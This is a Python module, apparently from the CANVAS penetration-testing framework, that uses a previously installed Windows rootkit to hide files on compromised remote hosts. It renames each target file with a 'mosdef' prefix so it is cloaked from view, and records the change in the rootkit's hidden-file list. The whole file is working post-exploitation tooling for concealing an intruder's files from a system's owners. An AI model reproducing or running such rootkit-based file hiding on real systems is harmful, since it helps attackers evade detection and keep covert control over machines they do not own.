#! /usr/bin/env python



#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2004
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path:
    sys.path.append(".")

import os,getopt
import socket
from exploitutils import *
import canvasengine
import time
from canvasexploit import canvasexploit

NAME="hidefile"
DESCRIPTION="Uses the Windows rootkit to hide files on the remote host. Renames an existing file with the 'mosdef' prefix. Keep in mind that running processes cannot have their executable's filename changed until they are stopped."
DOCUMENTATION={}
VERSION="1.0"

# properties
PROPERTY={}
PROPERTY['TYPE'] = "Trojans"
PROPERTY['ARCH'] = [ ["Windows"] ]

class theexploit(canvasexploit):
    def __init__(self):
        canvasexploit.__init__(self)
        self.result=""
        self.name=NAME
        self.filename   = None
        self.deletefile = False
        
        return
    
    def getArgs(self):
        """ get args """
        self.filename   = self.argsDict.get("filename", self.filename)    
        self.deletefile = self.argsDict.get("deletefile", self.deletefile)
        return 
    
    def set_hidden_file_flags( self, node, new_filename ):
        
        # Now we add it to the mosdef.hidden.files list on the remote host
        # this is so we can rename the file BACK when we're finished
        # As well if it gets flagged for deletion then we need to update that as well
        if self.deletefile:
            log_message = "%s|D\n" % new_filename
        else:
            log_message = "%s|%s|R\n" % ( new_filename, self.filename )

        ret = node.shell.update_rootkit_filelist( log_message )
        
        if ret != -1:
            self.log("Successfully updated the hidden file list.")
        else:
            self.log("Failed to update the hidden text file list. Please make sure you remember to clean this file ( %s ) manually!" % new_filename)
            
    def run(self):
        self.setInfo("%s (in progress)"%(NAME))
        self.getArgs()
        
        if not self.filename:
            self.log("You need to enter a file to hide on the remote host.")
            self.setInfo("%s - done (failed)" % (NAME))
            return 0
            
        node=self.argsDict["passednodes"][0]

        self.result=[]
        for node in self.argsDict["passednodes"]:
            nodetype=node.nodetype
            capabilities=node.capabilities
            if "win32api" in capabilities:
                
                if not "rootkit" in node.capabilities:
                    # Test for it
                    if node.shell.rootkit_present() == -1:
                        self.log("Rootkit not installed on the current host. Run loadrootkit.")
                        self.setInfo("%s - done (failed)" % NAME)
                        ret = -1
                        break
                
                
                if "\\" in self.filename:
                    basefile     = self.filename.split("\\")[::-1][0]
                    new_filename = self.filename.replace(basefile,"mosdef%s" % basefile)
                    
                if "/" in self.filename:
                    basefile     = self.filename.split("/")[::-1][0]
                    new_filename = self.filename.replace(basefile,"mosdef%s" % basefile)
                
                ret = node.shell.rename_file( self.filename, new_filename )
                
                if ret != -1:
                    self.log("Remote filename: %s successfully renamed to %s and is now cloaked from view." % ( self.filename, new_filename ) )
                    
                    # Set appropriate post-unloadrootkit flags for this file
                    self.set_hidden_file_flags( node, new_filename )
                
                else:
                    self.log("Failed to hide remote file.")
                    
                self.result+=[ret]
                
            else:
                self.log("The node named %s of type %s does not have the capabilities needed to run this command"%(node.get_name(),nodetype))
                self.result+=[0]
                
        if 1 in self.result:
            ret=1
        else:
            ret=0
        self.dispshellcmd = self.command
        self.setInfo("%s - done"%(NAME))
        return ret

